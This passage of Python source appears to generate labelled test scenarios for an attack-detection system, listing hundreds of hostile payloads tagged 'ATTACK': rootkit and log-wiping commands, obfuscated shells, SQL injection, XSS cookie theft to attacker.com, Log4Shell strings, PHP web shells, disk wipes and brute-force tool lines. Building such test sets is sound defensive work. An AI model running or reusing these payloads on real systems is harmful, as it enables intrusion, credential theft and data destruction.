        "cat /tmp/shellcode > /dev/shm/.stealth && chmod +x /dev/shm/.stealth && /dev/shm/.stealth",
        "cp /bin/sh /dev/shm/rootsh && chmod u+s /dev/shm/rootsh", "modprobe -r apparmor",
        "modprobe -r selinux", "setenforce 0", "echo 0 > /sys/fs/selinux/enforce",
        "dmesg -c > /dev/null", "history -c && history -w", "shred -u ~/.bash_history",
        "ln -sf /dev/null ~/.bash_history", "export HISTFILE=/dev/null", "export HISTSIZE=0",
        "unset HISTFILE", "kill -9 $$", "echo '' > /var/log/wtmp", "echo '' > /var/log/btmp",
        "echo '' > /var/log/lastlog", "touch -r /bin/ls /tmp/backdoor", "chattr +i /tmp/backdoor",
        "chattr +i /etc/ld.so.preload", "echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-wheel",
        "echo 'kernel.sysrq = 1' >> /etc/sysctl.conf", "echo 1 > /proc/sys/kernel/sysrq",
        "echo c > /proc/sysrq-trigger", "modprobe msr", "wrmsr -a 0xc0000080 0",
        "kexec -l /tmp/vmlinuz --initrd=/tmp/initrd", "kexec -e", "dd if=/dev/urandom of=/proc/kcore",
        "chmod 000 /var/log/audit/audit.log", "rm -f /var/run/utmp", "ln -s /dev/null /var/run/utmp",
        "ln -s /dev/null /var/log/wtmp", "ln -s /dev/null /var/log/btmp"
    ]
    for i, cmd in enumerate(rootkit_cmds):
        scenarios.append({
            "name": f"Memory / Rootkit Vector #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_ROOTKIT_MEMORY"
        })

    # 15. Obfuscated, Encoded & Evasive Shellcode Payloads (60 unique)
    obf_cmds = [
        "echo 'Y2F0IC9ldGMvc2hhZG93Cg==' | base64 -d | bash",
        "echo 'bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuNTAgNDQ0NA==' | base64 -d | sh",
        "base64 -d <<< 'cm0gLXJmIC8q' | bash",
        "printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77' | bash",
        "eval $(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77')",
        "export a='cat'; export b='/etc/shadow'; $a $b",
        "python3 -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('eJxLz0vP10vLzEtNLsnMTQQAFFgFAg==')))\"",
        "echo -e '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68' | bash",
        "$(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 --decode)",
        "eval $(echo 'cm0gLXJmIC90bXAvKg==' | base64 -d)",
        "echo 636174202f6574632f736861646f77 | xxd -p -r | bash",
        "echo 2f62696e2f7368 | xxd -r -p | sh",
        "printf %s 'c' 'a' 't' ' ' '/etc/shadow' | bash",
        "c''a\"\"t /e\"\"t'c'/s'h'a\"d\"o\\w",
        "/???/??t /???/s??d?w",
        "/usr/bin/p''y't'h\"o\"n3 -c 'import os; os.system(\"cat /etc/shadow\")'",
        "IFS=,;cmd=cat,/etc/shadow;$cmd",
        "${IFS}cat${IFS}/etc/shadow",
        "X=$'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68'; $X",
        "perl -e 'exec pack(\"H*\",\"636174202f6574632f736861646f77\")'",
        "python3 -c 'exec(__import__(\"bytes\").fromhex(\"696d706f7274206f733b6f732e73797374656d28272f62696e2f73682729\").decode())'",
        "php -r 'eval(hex2bin(\"6563686f2060636174202f6574632f736861646f77603b\"));'",
        "ruby -e 'eval([\"636174202f6574632f736861646f77\"].pack(\"H*\"))'",
        "bash -c '$(echo -e \"\\057\\0142\\0151\\0156\\0057\\0163\\0150\")'",
        "echo 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' | base64 | base64 | base64",
        "eval $(echo 'eval $(echo bmMgLWUgL2Jpbi9zaCAxLjEuMS4xIDQ0NDQ= | base64 -d)' | base64 -d)",
        "x=c; y=at; $x$y /etc/shadow",
        "a=/etc; b=/shadow; cat $a$b",
        "cmd=\"c\\a\\t /e\\t\\c/s\\h\\a\\d\\o\\w\"; eval $cmd",
        "`echo Y2F0 | base64 -d` `echo L2V0Yy9zaGFkb3c= | base64 -d`",
        "python3 -c \"exec(''.join([chr(x) for x in [105,109,112,111,114,116,32,111,115,59,111,115,46,115,121,115,116,101,109,40,39,105,100,39,41]]))\"",
        "powershell -EncodedCommand Y2F0IC9ldGMvc2hhZG93",
        "bash -c '{eval,$(\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77)}'",
        "echo -n 'cat /etc/shadow' | xxd -p | sed 's/../\\\\x&/g'",
        "openssl enc -base64 -d <<< 'Y2F0IC9ldGMvc2hhZG93' | bash",
        "gpg --decrypt --batch --passphrase 'pass' payload.gpg | sh",
        "zcat payload.gz | /bin/sh",
        "bzip2 -dc payload.bz2 | bash",
        "xz -dc payload.xz | /bin/sh",
        "tar -xOf payload.tar.gz | /bin/bash",
        "unzip -p payload.zip | /bin/sh",
        "7z e -so payload.7z | /bin/bash",
        "python3 -c \"import base64; exec(base64.b32decode('MNUHK3TLPE======'))\"",
        "python3 -c \"import base64; exec(base64.b85decode('L0u&ZGA-0#F*)'))\"",
        "echo '636174202f6574632f736861646f77' | perl -ne 'print pack(\"H*\",$_)' | sh",
        "echo 'print(open(\"/etc/shadow\").read())' | python3 -",
        "echo 'system(\"cat /etc/shadow\");' | perl -",
        "echo '<?php system(\"cat /etc/shadow\"); ?>' | php",
        "awk 'BEGIN {system(\"echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | sh\")}'",
        "sed '1e echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | sh' /etc/hosts",
        "cat << 'EOF' | base64 -d | bash\nY2F0IC9ldGMvc2hhZG93\nEOF",
        "curl -s http://attacker.com/b64.txt | base64 -d | bash",
        "wget -qO- http://attacker.com/hex.txt | xxd -r -p | sh",
        "curl -s http://attacker.com/rev.txt | rev | bash",
        "curl -s http://attacker.com/rot13.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash",
        "echo 'eval(gzuncompress(base64_decode(\"...\")));' | php",
        "python3 -c \"exec(__import__('marshal').loads(b'...'))\"",
        "perl -e 'eval pack(\"u*\",\"...\")'",
        "echo 'e1x4NjNceDYxXHg3NH0=' | base64 -d",
        "bash -c \"eval \\$(printf '\\143\\141\\164\\040\\057\\145\\164\\143\\057\\163\\150\\141\\144\\157\\167')\""
    ]
    for i, cmd in enumerate(obf_cmds):
        scenarios.append({
            "name": f"Obfuscated Shellcode #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_OBFUSCATION"
        })

    # 16. Web Application Attacks: SQL Injection (50 unique)
    sqli_payloads = [
        "' UNION SELECT 1,username,password_hash FROM information_schema.users--",
        "admin' OR '1'='1' UNION SELECT null,version(),user()--",
        "1; SELECT pg_sleep(10);--",
        "/api/v1/user?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "admin' AND 1=1--", "admin' AND 1=2--", "' OR 1=1#", "' OR 'x'='x",
        "1' ORDER BY 1--+", "1' ORDER BY 20--+", "1' UNION SELECT null,table_name FROM information_schema.tables--",
        "1' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--",
        "1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
        "1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--",
        "1; WAITFOR DELAY '0:0:10'--", "1'; EXEC xp_cmdshell('whoami');--",
        "1'; EXEC master..xp_dirtree '\\\\attacker.com\\share';--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRBP'='vRBP",
        "1' AND (SELECT 2947 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(2947=2947,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        "'; DROP TABLE users;--", "'; TRUNCATE TABLE audit_log;--", "'; INSERT INTO admin VALUES ('hacker','pass');--",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(user,0x3a,password) FROM mysql.user--",
        "1 UNION SELECT 1,load_file('/etc/passwd'),3,4,5--",
        "1 UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--",
        "1' UNION SELECT null,schema_name FROM information_schema.schemata--",
        "' OR '1'='1' /*", "' HAVING 1=1--", "' GROUP BY username HAVING 1=1--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--",
        "1' AND (SELECT unicode(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 0,1)=100--",
        "' UNION SELECT NULL,sql FROM sqlite_master--",
        "1' AND (SELECT 1 FROM pg_user WHERE usename='postgres')=1--",
        "1; COPY (SELECT '') TO PROGRAM 'nc 1.2.3.4 4444 -e /bin/sh'--",
        "1' AND BENCHMARK(10000000,MD5('test'))--",
        "' UNION SELECT @@version, @@datadir--",
        "admin' --", "admin' /*", "' or 1=1 or ''='",
        "' or ''='", "') or ('1'='1", "') or true--",
        "1' AND JSON_KEYS((SELECT JSON_ARRAY(version())))--",
        "1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "1' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        "1' AND ST_LatFromGeoHash(concat(0x7e,(SELECT version()),0x7e))--",
        "1' AND ST_LongFromGeoHash(concat(0x7e,(SELECT version()),0x7e))--",
        "1' AND GeometryCollection((select * from (select * from(select version())a)b))--",
        "admin' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata--",
        "' OR 1=1 ORDER BY 1--"
    ]
    for i, payload in enumerate(sqli_payloads):
        scenarios.append({
            "name": f"SQL Injection Attack #{i+1}",
            "type": "command",
            "payload": payload,
            "expected": "ATTACK",
            "category": "ATTACK_WEB_SQLI"
        })

    # 17. Web Application Attacks: XSS, SSTI, XXE & RCE (50 unique)
    web_exploit_payloads = [
        "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
        "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
        "<svg onload=alert(document.domain)>",
        "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
        "<body onload=document.location='http://attacker.com/loot?cookie='+document.cookie>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>",
        "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]>",
        "${jndi:ldap://c2.attacker.com:1389/Exploit}",
        "${${lower:j}ndi:${lower:l}dap://198.51.100.50/a}",
        "${jndi:rmi://198.51.100.50:1099/Object}",
        "${jndi:dns://attacker.com/token}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[407]('cat /etc/shadow',shell=True,stdout=-1).communicate()[0]}}",
        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/shadow')}",
        "#{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc')}",
        "<%= system('cat /etc/shadow') %>",
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "*{\"${#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}\"}",
        "(#_memberAccess['allowStaticMethodAccess']=true,#cmd='whoami',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start(),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush())",
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "expect://whoami",
        "input://",
        "phar:///var/www/html/uploads/avatar.jpg/shell.php",
        "zip:///var/www/html/uploads/avatar.zip#shell.php",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "<?php phpinfo(); ?>",
        "<?php system($_GET['c']); ?>",
        "<?=`$_GET[0]`?>",
        "<?php eval($_POST['pass']); ?>",
        "<?php @eval($_SERVER['HTTP_SHELL']); ?>",
        "<?php preg_replace('/.*/e', 'system(\"id\")', ''); ?>",
        "<?php create_function('', 'system(\"cat /etc/passwd\");')(); ?>",
        "<?php assert($_POST['cmd']); ?>",
        "<?php call_user_func('system', 'whoami'); ?>",
        "<?php uasort($arr, 'system'); ?>",
        "<?php mb_ereg_replace('.*', 'whoami', '', 'e'); ?>",
        "<script src=http://attacker.com/hook.js></script>",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
        "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
        "<a href=\"javascript:fetch('http://attacker.com/?cookie='+document.cookie)\">Click here</a>"
    ]
    for i, payload in enumerate(web_exploit_payloads):
        scenarios.append({
            "name": f"Web / Application Exploit #{i+1}",
            "type": "command",
            "payload": payload,
            "expected": "ATTACK",
            "category": "ATTACK_WEB_EXPLOIT"
        })

    # 18. Destructive Wipes, Ransomware & Sabotage (40 unique)
    wipe_cmds = [
        "rm -rf / --no-preserve-root", "rm -rf /*", "rm -rf /etc", "rm -rf /boot", "rm -rf /var",
        "rm -rf /usr", "rm -rf /bin", "rm -rf /sbin", "rm -rf /lib", "rm -rf /root",
        "dd if=/dev/zero of=/dev/sda bs=1M count=1000", "dd if=/dev/urandom of=/dev/nvme0n1",
        "dd if=/dev/zero of=/dev/vda bs=4M", "dd if=/dev/urandom of=/dev/sda1 bs=1M",
        "mkfs.ext4 -F /dev/sda1", "mkfs.ext4 -F /dev/sda", "mkfs.xfs -f /dev/sda1", "mkfs.btrfs -f /dev/sda",
        "mkswap -f /dev/sda1", "fdisk /dev/sda <<< 'd\nw'", "parted /dev/sda rm 1",
        "shred -u -z -n 5 /etc/shadow", "shred -n 3 -z -u /boot/vmlinuz-*", "shred -u -n 10 /etc/passwd",
        "find / -type f -exec openssl enc -aes-256-cbc -e -in {} -out {}.enc -k 'ransom' \\;",
        "echo 1 > /proc/sys/kernel/sysrq && echo c > /proc/sysrq-trigger",
        ":(){ :|:& };:", "forkbomb(){ forkbomb|forkbomb & };forkbomb",
        "wipefs -a -f /dev/sda", "wipefs -a -f /dev/nvme0n1", "blkdiscard -f /dev/sda",
        "sgdisk --zap-all /dev/sda", "head -c 100M /dev/urandom > /dev/sda",
        "cat /dev/urandom > /dev/mem", "cat /dev/zero > /dev/kmem",
        "chmod -R 000 /", "chown -R nobody:nogroup /",
        "find /var/www -type f -delete", "find / -name '*.db' -delete", "find / -name '*.sql' -exec rm -f {} \\;"
    ]
    for i, cmd in enumerate(wipe_cmds):
        scenarios.append({
            "name": f"Destructive Data Wipe #{i+1}",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_DESTRUCTIVE_WIPE"
        })

    # 19. Network Reconnaissance & Port Scanning Tools (40 unique)
    recon_cmds = [
        "nmap -sS -p 1-65535 192.168.1.1/24", "nmap -sT -A -T4 10.0.0.1", "nmap -sU --top-ports 100 192.168.1.50",
        "nmap -sF 192.168.1.100", "nmap -sX 192.168.1.100", "nmap -sN 192.168.1.100",
        "nmap --script vuln 192.168.1.200", "nmap --script smb-vuln-ms17-010 192.168.1.1/24",
        "masscan -p1-65535 10.0.0.0/16 --rate=10000", "zmap -p 80 198.51.100.0/24 -o zmap.txt",
        "hping3 -S --flood -V -p 80 192.168.1.1", "hping3 -1 --flood 192.168.1.1",
        "nikto -h http://192.168.1.100", "sqlmap -u 'http://192.168.1.100/page?id=1' --batch --dbs",
        "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt",
        "dirsearch -u http://192.168.1.100 -e php,html,js", "ffuf -u http://192.168.1.100/FUZZ -w wordlist.txt",
        "wfuzz -c -z file,wordlist.txt --hc 404 http://192.168.1.100/FUZZ",
        "nuclei -u http://192.168.1.100 -t cves/", "wpscan --url http://192.168.1.100 --enumerate u,vp",
        "enum4linux -a 192.168.1.100", "smbclient -L //192.168.1.100/ -N", "smbmap -H 192.168.1.100",
        "snmpwalk -v2c -c public 192.168.1.100", "onesixtyone -c community.txt 192.168.1.100",
        "hydra -l root -P passwords.txt ssh://192.168.1.100", "medusa -h 192.168.1.100 -u admin -P pass.txt -M ssh",
        "patator ssh_login host=192.168.1.100 user=root password=FILE0 0=pass.txt",
        "ncrack -v --user root -P pass.txt ssh://192.168.1.100", "crowbar -b sshkey -s 192.168.1.100/32 -u root -k /keys/",
        "amass enum -d target.corp", "sublist3r -d target.corp", "assetfinder --subs-only target.corp",
        "findomain -t target.corp", "subfinder -d target.corp", "dnsenum --enum target.corp",
        "fierce --domain target.corp", "dnsrecon -d target.corp -t std",
        "theHarvester -d target.corp -b all", "responder -I eth0 -wrf"
    ]
    for i, cmd in enumerate(recon_cmds):
        scenarios.append({
            "name": f"Offensive Tooling / Scan #{i+1} ({cmd.split()[0]})",
            "type": "command",
            "payload": cmd,
            "expected": "ATTACK",
            "category": "ATTACK_RECON_SCAN"
        })

    # 20. SSH Brute-Force & Credential Stuffing Syslog Events (40 unique)
    for i in range(1, 41):
        target_ip = f"203.0.113.{10+i}"
        target_port = 40000 + i
        user = "root" if i % 2 == 0 else f"admin_{i}"
        log_str = f"sshd[{20000+i}]: Failed password for {user} from {target_ip} port {target_port} ssh2"
        scenarios.append({
            "name": f"SSH Brute-Force Burst #{i}",
            "type": "log",
            "payload": log_str,
            "expected": "ATTACK",
            "category": "ATTACK_SSH_BRUTE_FORCE"
        })

    return scenarios
